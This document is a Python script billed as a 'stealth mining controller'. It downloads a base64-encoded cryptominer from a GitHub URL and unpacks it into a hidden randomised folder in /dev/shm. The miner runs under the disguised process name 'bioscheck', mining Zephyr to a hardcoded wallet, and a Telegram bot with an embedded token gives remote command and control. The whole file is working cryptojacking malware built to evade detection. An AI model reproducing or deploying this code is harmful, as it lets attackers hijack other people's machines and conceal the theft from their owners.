# forge.py — Final Stealth Mining Controller

import os
import subprocess
import requests
import json
import telebot
import time
import threading
import socket
from datetime import datetime

# === USER CONFIG ===
BOT_TOKEN = '7987532893:AAGvwCj4X83Qr5IFYyk3GeO3synDYR5Xh4Y'
ADMIN_ID = 7285391034  # Replace with your actual Telegram ID
CONFIG_FILE = os.path.expanduser("~/.forge_config.json")
LOG_FILE = "/tmp/miner.log"
MINER_NAME = "bioscheck"
MINER_PATH = "/dev/shm/.cache-{}/bioscheck".format(os.urandom(3).hex())
B64_URL = "https://raw.githubusercontent.com/Anderson816/foreverminer/main/forever.b64"
DEFAULT_POOL = "fr.zephyr.herominers.com:1123"

bot = telebot.TeleBot(BOT_TOKEN)

# === CONFIG HANDLER ===
def load_config():
    if os.path.exists(CONFIG_FILE):
        with open(CONFIG_FILE, 'r') as f:
            return json.load(f)
    else:
        return {
            "wallet": "ZEPHYR2zxTXUfUEtvhU5QSDjPPBq6XtoU8faeFj3mTEr5hWs5zERHsXT9xc6ivLNMmbbQvxWvGUaxAyyLv3Cnbb9MgemKUED19M2b",
            "worker": "A0",
            "threads": 4,
            "pool": DEFAULT_POOL
        }

def save_config(cfg):
    with open(CONFIG_FILE, 'w') as f:
        json.dump(cfg, f)

config = load_config()

# === MINER FUNCTIONS ===
def fetch_and_decode_miner():
    try:
        data = requests.get(B64_URL).content
        binary = base64.b64decode(data)
        os.makedirs(os.path.dirname(MINER_PATH), exist_ok=True)
        with open(MINER_PATH, 'wb') as f:
            f.write(binary)
        os.chmod(MINER_PATH, 0o755)
    except Exception as e:
        return str(e)

def is_miner_running():
    try:
        out = subprocess.check_output(["pgrep", "-f", MINER_NAME])
        return True
    except subprocess.CalledProcessError:
        return False

def start_miner():
    if is_miner_running():
        return
    fetch_and_decode_miner()
    cmd = f"exec -a {MINER_NAME} {MINER_PATH} --donate-level=0 --threads={config['threads']} -o {config['pool']} -u {config['wallet']}.{config['worker']} -p x --coin zeph --tls"
    with open(LOG_FILE, "w") as log:
        subprocess.Popen(cmd, shell=True, stdout=log, stderr=log)

def stop_miner():
    subprocess.call(["pkill", "-f", MINER_NAME])

def get_hashrate():
    if not os.path.exists(LOG_FILE):
        return "No logs."
    with open(LOG_FILE, 'r') as f:
        lines = f.readlines()
    for line in reversed(lines):
        if "speed" in line:
            return line.strip()
    return "No hashrate found."

def get_status():
    ip = socket.gethostbyname(socket.gethostname())
    uptime = subprocess.check_output("uptime -p", shell=True).decode().strip()
    running = "Yes" if is_miner_running() else "No"
    return f"💠 <b>Status</b>\nMiner: <code>{running}</code>\nIP: <code>{ip}</code>\nUptime: <code>{uptime}</code>\nWorker: <code>{config['worker']}</code>\nThreads: <code>{config['threads']}</code>\nPool: <code>{config['pool']}</code>"

# === TELEGRAM COMMANDS ===

def is_admin(msg):
    return msg.from_user.id == ADMIN_ID

@bot.message_handler(commands=['start'])
def cmd_start(msg):
    if is_admin(msg):
        start_miner()
        bot.reply_to(msg, "🚀 Miner started.")

@bot.message_handler(commands=['stop'])
def cmd_stop(msg):
    if is_admin(msg):
        stop_miner()
        bot.reply_to(msg, "🛑 Miner stopped.")

@bot.message_handler(commands=['status'])
def cmd_status(msg):
    if is_admin(msg):
        bot.reply_to(msg, get_status(), parse_mode="HTML")

@bot.message_handler(commands=['log'])
def cmd_log(msg):
    if is_admin(msg):
        if not os.path.exists(LOG_FILE):
            bot.reply_to(msg, "No log file found.")
            return
        with open(LOG_FILE) as f:
            lines = f.readlines()[-20:]
        bot.reply_to(msg, "<code>{}</code>".format(''.join(lines[-20:])), parse_mode="HTML")

@bot.message_handler(commands=['speed'])
def cmd_speed(msg):
    if is_admin(msg):
        bot.reply_to(msg, get_hashrate())

@bot.message_handler(commands=['setworker'])
def cmd_setworker(msg):
    if is_admin(msg):
        parts = msg.text.strip().split()
        if len(parts) != 2:
            bot.reply_to(msg, "Usage: /setworker <name>")
            return
        config['worker'] = parts[1]
        save_config(config)
        bot.reply_to(msg, f"✅ Worker set to: <code>{parts[1]}</code>", parse_mode="HTML")

@bot.message_handler(commands=['wallet'])
def cmd_wallet(msg):
    if is_admin(msg):
        parts = msg.text.strip().split()
        if len(parts) != 2:
            bot.reply_to(msg, "Usage: /wallet <address>")
            return
        config['wallet'] = parts[1]
        save_config(config)
        bot.reply_to(msg, f"✅ Wallet set.")

@bot.message_handler(commands=['threads'])
def cmd_threads(msg):
    if is_admin(msg):
        parts = msg.text.strip().split()
        if len(parts) != 2 or not parts[1].isdigit():
            bot.reply_to(msg, "Usage: /threads <count>")
            return
        config['threads'] = int(parts[1])
        save_config(config)
        bot.reply_to(msg, f"✅ Threads set to: {parts[1]}")

@bot.message_handler(commands=['updateb64'])
def cmd_updateb64(msg):
    if is_admin(msg):
        stop_miner()
        time.sleep(1)
        fetch_and_decode_miner()
        start_miner()
        bot.reply_to(msg, "♻️ Miner updated and restarted.")

# === START TELEGRAM LOOP ===
threading.Thread(target=bot.infinity_polling, daemon=True).start()

# === IDLE KEEP-ALIVE ===
while True:
    time.sleep(3600)
